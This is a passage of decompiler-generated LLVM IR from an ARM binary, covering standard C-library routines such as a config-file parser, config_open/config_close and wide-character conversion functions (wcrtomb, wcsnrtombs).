  store i32 %v6_125ac, i32* %r2.global-to-local, align 4
  store i32 %v6_125ac, i32* %v2_125a0, align 4
  %v0_125cc.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125cc:                               ; preds = %dec_label_pc_125ccthread-pre-split, %dec_label_pc_125b8, %dec_label_pc_125c4
  %v1_125d0 = phi i32 [ %v0_125cc.pr, %dec_label_pc_125ccthread-pre-split ], [ %v2_125bc, %dec_label_pc_125b8 ], [ %v1_125c8, %dec_label_pc_125c4 ]
  %v7_125cc = icmp eq i32 %v1_125d0, 10
  store i1 %v7_125cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125cc, label %dec_label_pc_125d8.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_125cc
  %v8_125d0 = icmp eq i32 %v1_125d0, -1
  store i1 %v8_125d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_125d0, label %dec_label_pc_125d8.loopexit, label %.dec_label_pc_12590_crit_edge

.dec_label_pc_12590_crit_edge:                    ; preds = %bb66
  %v0_12590.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12590

dec_label_pc_125d8.loopexit:                      ; preds = %bb66, %dec_label_pc_125cc
  %v0_125d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %dec_label_pc_12530, %dec_label_pc_125d8.loopexit
  %v0_125d8 = phi i32 [ %v0_125d8.pre, %dec_label_pc_125d8.loopexit ], [ %v1_12544, %dec_label_pc_12530 ]
  %v7_125d8 = icmp eq i32 %v0_125d8, -1
  store i1 %v7_125d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_125d8, label %dec_label_pc_12720, label %dec_label_pc_125e0

dec_label_pc_125e0:                               ; preds = %dec_label_pc_125d8
  store i32 %v1_12448, i32* %r3.global-to-local, align 4
  store i1 %v2_125e4, i1* %cpsr_z.global-to-local, align 1
  %v0_125e8 = load i32, i32* @r5, align 4
  %v1_125e8 = add i32 %v0_125e8, 12
  %v2_125e8 = inttoptr i32 %v1_125e8 to i32*
  %v3_125e8 = load i32, i32* %v2_125e8, align 4
  store i32 %v3_125e8, i32* @r4, align 4
  br i1 %v2_125e4, label %dec_label_pc_12600, label %dec_label_pc_125f0

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125e0
  store i32 %v3_125e8, i32* @r0, align 4
  %v1_125f8 = inttoptr i32 %v3_125e8 to i8*
  %v2_125f8 = call i32 @__GI_strspn(i8* %v1_125f8)
  store i32 %v2_125f8, i32* %r0.global-to-local, align 4
  %v0_125fc = load i32, i32* @r4, align 4
  %v2_125fc = add i32 %v0_125fc, %v2_125f8
  store i32 %v2_125fc, i32* @r4, align 4
  br label %dec_label_pc_12600

dec_label_pc_12600:                               ; preds = %dec_label_pc_125e0, %dec_label_pc_125f0
  %v0_12600 = phi i32 [ %v3_125e8, %dec_label_pc_125e0 ], [ %v2_125fc, %dec_label_pc_125f0 ]
  %v1_12600 = inttoptr i32 %v0_12600 to i8*
  %v2_12600 = load i8, i8* %v1_12600, align 1
  %v3_12600 = zext i8 %v2_12600 to i32
  store i32 %v3_12600, i32* %r2.global-to-local, align 4
  %v2_12604 = icmp eq i8 %v2_12600, 0
  store i1 %v2_12604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12604, label %dec_label_pc_12470.backedge, label %dec_label_pc_1260c

dec_label_pc_12470.backedge:                      ; preds = %dec_label_pc_12600, %dec_label_pc_1260c, %dec_label_pc_12718
  %v0_12470.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12470

dec_label_pc_1260c:                               ; preds = %dec_label_pc_12600
  %v0_1260c = load i32, i32* @r7, align 4
  %v1_1260c = inttoptr i32 %v0_1260c to i8*
  %v2_1260c = load i8, i8* %v1_1260c, align 1
  %v3_1260c = zext i8 %v2_1260c to i32
  store i32 %v3_1260c, i32* %r3.global-to-local, align 4
  %v9_12610 = icmp eq i8 %v2_1260c, %v2_12600
  store i1 %v9_12610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12610, label %dec_label_pc_12470.backedge, label %dec_label_pc_12618

dec_label_pc_12618:                               ; preds = %dec_label_pc_1260c
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_1261c = load i32, i32* @r5, align 4
  %v1_1261c = add i32 %v0_1261c, 4
  %v2_1261c = inttoptr i32 %v1_1261c to i32*
  %v3_1261c = load i32, i32* %v2_1261c, align 4
  store i32 %v3_1261c, i32* %r0.global-to-local, align 4
  %v0_12620 = load i32, i32* @fp, align 4
  store i32 %v3_1261c, i32* %v1_1263c, align 4
  store i32 %v3_12434, i32* %r2.global-to-local, align 4
  %v3_1262c = inttoptr i32 %v3_1261c to i8*
  %v4_1262c = call i32 @__GI_memset(i8* %v3_1262c, i32 %v0_12620, i32 %v3_12434)
  store i32 %v4_1262c, i32* %r0.global-to-local, align 4
  %v0_12630 = load i32, i32* @fp, align 4
  store i32 %v0_12630, i32* @r6, align 4
  %v0_126f012 = load i32, i32* @r4, align 4
  %v1_126f013 = inttoptr i32 %v0_126f012 to i8*
  %v2_126f014 = load i8, i8* %v1_126f013, align 1
  %v3_126f015 = zext i8 %v2_126f014 to i32
  store i32 %v3_126f015, i32* %r2.global-to-local, align 4
  %v2_126f416 = icmp eq i8 %v2_126f014, 0
  store i1 %v2_126f416, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_126f416, label %dec_label_pc_1270c, label %dec_label_pc_126fc

dec_label_pc_12638:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_1263c = load i32, i32* %v1_1263c, align 4
  store i32 %v2_1263c, i32* %r3.global-to-local, align 4
  store i32 %v1_1244c, i32* %r2.global-to-local, align 4
  %v9_12644 = icmp eq i32 %v2_12648, %v1_1244c
  store i1 %v9_12644, i1* %cpsr_z.global-to-local, align 1
  %v5_12648 = mul i32 %v2_12648, 4
  %v6_12648 = add i32 %v2_1263c, %v5_12648
  %v7_12648 = inttoptr i32 %v6_12648 to i32*
  store i32 %v0_12648, i32* %v7_12648, align 4
  br i1 %v9_12644, label %dec_label_pc_12650, label %dec_label_pc_1265c

dec_label_pc_12650:                               ; preds = %dec_label_pc_12638
  store i32 %v1_12458, i32* %r3.global-to-local, align 4
  store i1 %v2_12654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12654, label %dec_label_pc_1265c, label %dec_label_pc_1267c

dec_label_pc_1265c:                               ; preds = %dec_label_pc_12650, %dec_label_pc_12638
  %v0_1265c = load i32, i32* @r7, align 4
  %v1_1265c = inttoptr i32 %v0_1265c to i8*
  %v2_1265c = load i8, i8* %v1_1265c, align 1
  %v3_1265c = zext i8 %v2_1265c to i32
  store i32 %v3_1265c, i32* %r3.global-to-local, align 4
  %v2_12660 = icmp eq i8 %v2_1265c, 0
  store i1 %v2_12660, i1* %cpsr_z.global-to-local, align 1
  %v0_12664 = load i32, i32* @r4, align 4
  store i32 %v0_12664, i32* @r0, align 4
  %v1_12668 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_12660, i32 %v1_12668, i32 %v0_1265c
  store i32 %storemerge, i32* @r1, align 4
  %v0_12670 = call i32 @strcspn()
  store i32 %v0_12670, i32* %r0.global-to-local, align 4
  %v0_12674 = load i32, i32* @r4, align 4
  %v2_12674 = add i32 %v0_12674, %v0_12670
  store i32 %v2_12674, i32* @r4, align 4
  br label %dec_label_pc_126b4

dec_label_pc_1267c:                               ; preds = %dec_label_pc_12650
  %v0_1267c = load i32, i32* @r4, align 4
  store i32 %v0_1267c, i32* @r0, align 4
  %v0_12680 = load i32, i32* @r7, align 4
  %v1_12680 = inttoptr i32 %v0_12680 to i8*
  %v2_12680 = load i8, i8* %v1_12680, align 1
  %v3_12680 = zext i8 %v2_12680 to i32
  %v5_12684 = call i32 @__GI_strchrnul(i32 %v0_1267c, i32 %v3_12680, i32 %v1_1244c, i32 %v1_12458)
  store i32 %v5_12684, i32* %r0.global-to-local, align 4
  store i32 %v1_12448, i32* %r2.global-to-local, align 4
  store i1 %v2_125e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12684, i32* @r4, align 4
  br i1 %v2_125e4, label %dec_label_pc_126b4, label %dec_label_pc_126a0

dec_label_pc_1269c:                               ; preds = %dec_label_pc_126a0
  %v1_1269c = add i32 %v0_126b4.pre, -1
  store i32 %v1_1269c, i32* @r4, align 4
  br label %dec_label_pc_126a0

dec_label_pc_126a0:                               ; preds = %dec_label_pc_1267c, %dec_label_pc_1269c
  %v0_126a0 = phi i32 [ %v1_1269c, %dec_label_pc_1269c ], [ %v5_12684, %dec_label_pc_1267c ]
  %v1_126a0 = add i32 %v0_126a0, -1
  %v2_126a0 = inttoptr i32 %v1_126a0 to i8*
  %v3_126a0 = load i8, i8* %v2_126a0, align 1
  %v4_126a0 = zext i8 %v3_126a0 to i32
  %v0_126a4 = load i32, i32* @sl, align 4
  store i32 %v0_126a4, i32* @r0, align 4
  %v2_126a8 = call i32 @__GI_strchr(i32 %v0_126a4, i32 %v4_126a0)
  store i32 %v2_126a8, i32* %r0.global-to-local, align 4
  %v2_126ac = icmp eq i32 %v2_126a8, 0
  store i1 %v2_126ac, i1* %cpsr_z.global-to-local, align 1
  %v0_126b4.pre = load i32, i32* @r4, align 4
  br i1 %v2_126ac, label %dec_label_pc_126b4, label %dec_label_pc_1269c

dec_label_pc_126b4:                               ; preds = %dec_label_pc_126a0, %dec_label_pc_1267c, %dec_label_pc_1265c
  %v3_126c0 = phi i32 [ %v5_12684, %dec_label_pc_1267c ], [ %v2_12674, %dec_label_pc_1265c ], [ %v0_126b4.pre, %dec_label_pc_126a0 ]
  %v1_126b4 = inttoptr i32 %v3_126c0 to i8*
  %v2_126b4 = load i8, i8* %v1_126b4, align 1
  %v3_126b4 = zext i8 %v2_126b4 to i32
  store i32 %v3_126b4, i32* %r2.global-to-local, align 4
  %v0_126b8 = load i32, i32* @r7, align 4
  %v1_126b8 = inttoptr i32 %v0_126b8 to i8*
  %v2_126b8 = load i8, i8* %v1_126b8, align 1
  %v3_126b8 = zext i8 %v2_126b8 to i32
  store i32 %v3_126b8, i32* %r3.global-to-local, align 4
  %v9_126bc = icmp eq i8 %v2_126b8, %v2_126b4
  store i1 %v9_126bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_126bc, label %bb69, label %dec_label_pc_126c8

bb69:                                             ; preds = %dec_label_pc_126b4
  %v1_126c0 = load i32, i32* @fp, align 4
  %v2_126c0 = trunc i32 %v1_126c0 to i8
  store i8 %v2_126c0, i8* %v1_126b4, align 1
  %v0_126c4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_126c4.pr, label %bb71, label %.dec_label_pc_126c8_crit_edge

.dec_label_pc_126c8_crit_edge:                    ; preds = %bb69
  %v0_126c8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %.dec_label_pc_126c8_crit_edge, %dec_label_pc_126b4
  %v0_126c8 = phi i32 [ %v0_126c8.pre, %.dec_label_pc_126c8_crit_edge ], [ %v3_126b4, %dec_label_pc_126b4 ]
  %v2_126c8 = icmp eq i32 %v0_126c8, 0
  store i1 %v2_126c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_126c8, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_126c8
  %v1_126cc = load i32, i32* @fp, align 4
  %v2_126cc = trunc i32 %v1_126cc to i8
  %v3_126cc = load i32, i32* @r4, align 4
  %v4_126cc = inttoptr i32 %v3_126cc to i8*
  store i8 %v2_126cc, i8* %v4_126cc, align 1
  %v5_126cc = load i32, i32* @r4, align 4
  %v6_126cc = add i32 %v5_126cc, 1
  store i32 %v6_126cc, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_126c8, %bb70
  %v2_126d0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_126d0, i32* %r3.global-to-local, align 4
  %v2_126d4 = icmp eq i32 %v2_126d0, 0
  store i1 %v2_126d4, i1* %cpsr_z.global-to-local, align 1
  %v0_126f0.pre = load i32, i32* @r4, align 4
  br i1 %v2_126d4, label %dec_label_pc_126ec, label %dec_label_pc_126dc

dec_label_pc_126dc:                               ; preds = %bb71
  store i32 %v0_126f0.pre, i32* @r0, align 4
  %v1_126e4 = inttoptr i32 %v0_126f0.pre to i8*
  %v2_126e4 = call i32 @__GI_strspn(i8* %v1_126e4)
  store i32 %v2_126e4, i32* %r0.global-to-local, align 4
  %v0_126e8 = load i32, i32* @r4, align 4
  %v2_126e8 = add i32 %v0_126e8, %v2_126e4
  store i32 %v2_126e8, i32* @r4, align 4
  br label %dec_label_pc_126ec

dec_label_pc_126ec:                               ; preds = %bb71, %dec_label_pc_126dc
  %v0_126f0 = phi i32 [ %v2_126e8, %dec_label_pc_126dc ], [ %v0_126f0.pre, %bb71 ]
  %v0_126ec = load i32, i32* @r6, align 4
  %v1_126ec = add i32 %v0_126ec, 1
  store i32 %v1_126ec, i32* @r6, align 4
  %v1_126f0 = inttoptr i32 %v0_126f0 to i8*
  %v2_126f0 = load i8, i8* %v1_126f0, align 1
  %v3_126f0 = zext i8 %v2_126f0 to i32
  store i32 %v3_126f0, i32* %r2.global-to-local, align 4
  %v2_126f4 = icmp eq i8 %v2_126f0, 0
  store i1 %v2_126f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_126f4, label %dec_label_pc_1270c, label %dec_label_pc_126fc

dec_label_pc_126fc:                               ; preds = %dec_label_pc_12618, %dec_label_pc_126ec
  %v0_12648 = phi i32 [ %v0_126f0, %dec_label_pc_126ec ], [ %v0_126f012, %dec_label_pc_12618 ]
  %v2_12648 = phi i32 [ %v1_126ec, %dec_label_pc_126ec ], [ %v0_12630, %dec_label_pc_12618 ]
  %v1_12700 = phi i32 [ %v3_126f0, %dec_label_pc_126ec ], [ %v3_126f015, %dec_label_pc_12618 ]
  %v0_126fc = load i32, i32* @r7, align 4
  %v1_126fc = inttoptr i32 %v0_126fc to i8*
  %v2_126fc = load i8, i8* %v1_126fc, align 1
  %v3_126fc = zext i8 %v2_126fc to i32
  store i32 %v3_126fc, i32* %r3.global-to-local, align 4
  %v9_12700 = icmp eq i32 %v3_126fc, %v1_12700
  store i1 %v9_12700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12700, label %dec_label_pc_1270c, label %bb72

bb72:                                             ; preds = %dec_label_pc_126fc
  %v2_12704 = load i32, i32* @sb, align 4
  %v3_12704 = sub i32 %v2_12648, %v2_12704
  %v5_12704 = xor i32 %v2_12704, %v2_12648
  %v6_12704 = xor i32 %v3_12704, %v2_12648
  %v7_12704 = and i32 %v6_12704, %v5_12704
  %v8_12704 = icmp slt i32 %v7_12704, 0
  %v9_12704 = icmp slt i32 %v3_12704, 0
  %v10_12704 = icmp eq i32 %v2_12648, %v2_12704
  store i1 %v10_12704, i1* %cpsr_z.global-to-local, align 1
  %v2_12708 = xor i1 %v9_12704, %v8_12704
  br i1 %v2_12708, label %dec_label_pc_12638, label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_126fc, %dec_label_pc_126ec, %bb72, %dec_label_pc_12618
  %v0_12710 = phi i32 [ %v0_12630, %dec_label_pc_12618 ], [ %v2_12648, %dec_label_pc_126fc ], [ %v1_126ec, %dec_label_pc_126ec ], [ %v2_12648, %bb72 ]
  store i32 %v3_12430, i32* %r2.global-to-local, align 4
  %v9_12710 = icmp eq i32 %v0_12710, %v3_12430
  store i1 %v9_12710, i1* %cpsr_z.global-to-local, align 1
  %v6_12714 = icmp slt i32 %v0_12710, %v3_12430
  br i1 %v6_12714, label %dec_label_pc_12718, label %dec_label_pc_12724

dec_label_pc_12718:                               ; preds = %dec_label_pc_1270c
  %v0_12718 = load i32, i32* @r8, align 4
  %v1_12718 = and i32 %v0_12718, 1048576
  %v2_12718 = icmp eq i32 %v1_12718, 0
  store i1 %v2_12718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12718, label %dec_label_pc_12470.backedge, label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %dec_label_pc_12718, %dec_label_pc_125d8, %.thread, %entry
  br label %dec_label_pc_12724

dec_label_pc_12724:                               ; preds = %dec_label_pc_1270c, %dec_label_pc_124f4, %dec_label_pc_12720
  %v0_12724 = phi i32 [ %v0_12504, %dec_label_pc_124f4 ], [ 0, %dec_label_pc_12720 ], [ %v0_12710, %dec_label_pc_1270c ]
  store i32 %v0_12724, i32* %r0.global-to-local, align 4
  store i32 %v3_1240c, i32* @r4, align 4
  store i32 %v6_1240c, i32* @r5, align 4
  store i32 %v9_1240c, i32* @r6, align 4
  store i32 %v12_1240c, i32* @r7, align 4
  store i32 %v15_1240c, i32* @r8, align 4
  store i32 %v18_1240c, i32* @sb, align 4
  store i32 %v21_1240c, i32* @sl, align 4
  store i32 %v24_1240c, i32* @fp, align 4
  ret i32 %v0_12724

; uselistorder directives
  uselistorder i32 %v0_12724, { 1, 0 }
  uselistorder i32 %v0_12710, { 0, 2, 1 }
  uselistorder i32 %v3_12704, { 1, 0 }
  uselistorder i32 %v2_12704, { 1, 0, 2 }
  uselistorder i32 %v2_12648, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_126f0.pre, { 0, 2, 1 }
  uselistorder i32 %v5_12684, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12630, { 1, 0, 2 }
  uselistorder i1 %v9_12610, { 1, 0 }
  uselistorder i32 %v3_125e8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_125d8, { 1, 0 }
  uselistorder i1 %v8_125d0, { 1, 0 }
  uselistorder i32 %v3_125a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_12590, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v2_12578, { 1, 0, 2 }
  uselistorder i32 %v1_12568, { 1, 0, 2 }
  uselistorder i32 %v0_12554, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1254c, { 1, 0 }
  uselistorder i32 %v1_12538, { 1, 0 }
  uselistorder i32 %v1_12534, { 1, 0 }
  uselistorder i32 %v2_12510, { 1, 0 }
  uselistorder i32 %v1_124f4, { 2, 0, 1 }
  uselistorder i32 %v0_124dc, { 1, 0 }
  uselistorder i32 %v1_124cc, { 0, 2, 1 }
  uselistorder i32* %v1_1263c, { 1, 0 }
  uselistorder i1 %v2_125e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12458, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1244c, { 2, 1, 0 }
  uselistorder i32 %v3_12434, { 1, 2, 0 }
  uselistorder i32 %v3_12430, { 2, 1, 0 }
  uselistorder i32 %v1_12428, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 131072, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12724, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1270c, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_126fc, { 1, 0 }
  uselistorder label %dec_label_pc_126ec, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_126a0, { 1, 0 }
  uselistorder label %dec_label_pc_12470.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12600, { 1, 0 }
  uselistorder label %dec_label_pc_125d8, { 1, 0 }
  uselistorder label %dec_label_pc_125cc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12590, { 1, 0 }
  uselistorder label %dec_label_pc_124c4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_12738 = icmp eq i32* %arg1, null
  br i1 %v2_12738, label %dec_label_pc_12760, label %dec_label_pc_12740

dec_label_pc_12740:                               ; preds = %entry
  %v2_12740 = load i32, i32* %arg1, align 4
  %v1_12744 = inttoptr i32 %v2_12740 to i16*
  %v2_12744 = call i32 @__GI_fclose(i16* %v1_12744)
  %v0_12748 = load i32, i32* @r4, align 4
  %v1_12748 = add i32 %v0_12748, 20
  %v2_12748 = inttoptr i32 %v1_12748 to i32*
  %v3_12748 = load i32, i32* %v2_12748, align 4
  %v2_1274c = icmp eq i32 %v3_12748, 0
  br i1 %v2_1274c, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_12740
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_12740, %bb
  store i32 75608, i32* @lr, align 4
  %v1_12754 = xor i1 %v2_1274c, true
  call void @__pseudo_cond_branch(i1 %v1_12754, i32 ptrtoint (i32* @global_var_f3b8.198 to i32))
  %v0_12758 = load i32, i32* @r4, align 4
  store i32 %v0_12758, i32* @r0, align 4
  %v0_1275c = call i32 @free()
  br label %dec_label_pc_12760

dec_label_pc_12760:                               ; preds = %entry, %bb6
  %v1_12764 = phi i32 [ 0, %entry ], [ %v0_1275c, %bb6 ]
  ret i32 %v1_12764

; uselistorder directives
  uselistorder label %dec_label_pc_12760, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12774 = load i32, i32* @r4, align 4
  store i32 %v3_12774, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33232), i32* @r1, align 4
  %v0_1277c = load i32, i32* @r0, align 4
  %v2_1277c = call i32 @__GI_fopen(i32 %v0_1277c, i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33232))
  store i32 %v2_1277c, i32* %r0.global-to-local, align 4
  store i32 %v2_1277c, i32* @r4, align 4
  %v2_12780 = icmp eq i32 %v2_1277c, 0
  br i1 %v2_12780, label %bb, label %dec_label_pc_1278c

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_1278c:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12794 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_12794, i32* %r0.global-to-local, align 4
  %v2_12798 = icmp eq i32 %v2_12794, 0
  br i1 %v2_12798, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_1278c
  %v1_1279c = load i32, i32* @r4, align 4
  %v3_1279c = inttoptr i32 %v2_12794 to i32*
  store i32 %v1_1279c, i32* %v3_1279c, align 4
  %v1_127a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_1278c, %bb4
  %v1_127a4 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_1278c ], [ %v1_127a4.pre, %bb4 ]
  %v2_127a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_127a0, i32* @r4, align 4
  ret i32 %v1_127a4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33232), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_127b0 = load i32, i32* @lr, align 4
  %v2_127b4 = icmp eq i32 %arg1, 0
  br i1 %v2_127b4, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_127bc = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_127e4 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_127d0 = phi i32 [ %arg1, %.thread ], [ %v3_127bc, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_127cc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_127cc, i32* @ip, align 4
  %v2_127d4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_127cc, i32* %stack_var_-16, align 4
  store i32 %v0_127e4, i32* %stack_var_-12, align 4
  %v5_127ec = inttoptr i32 %v0_127d0 to i8*
  %v6_127ec = call i32 @__GI_wcsnrtombs(i8* %v5_127ec, i32 %v2_127d4, i32 1, i32 16, i32 %arg3)
  %v2_127f0 = icmp eq i32 %v6_127ec, 0
  br i1 %v2_127f0, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_12800 = phi i32 [ %v6_127ec, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_127b0, i32* @lr, align 4
  ret i32 %v1_12800

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_12818 = load i32, i32* @r0, align 4
  %v1_12818 = load i32, i32* @r1, align 4
  %v5_12818 = inttoptr i32 %v0_12818 to i8*
  %v6_12818 = call i32 @__GI_wcsnrtombs(i8* %v5_12818, i32 %v1_12818, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_12818

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12828 = load i32, i32* @r4, align 4
  store i32 %v3_12828, i32* %stack_var_-12, align 4
  %v10_1282c = icmp eq i32 %tmp, %arg2
  store i1 %v10_1282c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_1282c, label %dec_label_pc_12844, label %bb

bb:                                               ; preds = %entry
  %v4_12830 = icmp eq i8* %arg1, null
  store i1 %v4_12830, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_12830, label %dec_label_pc_12844.thread, label %bb39

dec_label_pc_12844.thread:                        ; preds = %bb
  %v2_12834 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_12844:                               ; preds = %entry
  %v2_128341 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_12844 = icmp eq i8* %arg1, null
  store i1 %v3_12844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12844, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12844
  store i32 %v2_128341, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_12844, %dec_label_pc_12844.thread
  %storemerge20 = phi i32 [ %v2_128341, %dec_label_pc_12844 ], [ %v2_12834, %dec_label_pc_12844.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_128a828 = phi i32 [ %v2_128341, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_1285c = load i32, i32* @r3, align 4
  %v3_1285c = icmp uge i32 %v0_1285c, %arg3
  %arg3.v0_1285c = select i1 %v3_1285c, i32 %arg3, i32 %v0_1285c
  store i32 %arg3.v0_1285c, i32* %r5.global-to-local, align 4
  %v1_12868 = inttoptr i32 %arg2 to i32*
  %v2_12868 = load i32, i32* %v1_12868, align 4
  store i32 %v2_12868, i32* %r2.global-to-local, align 4
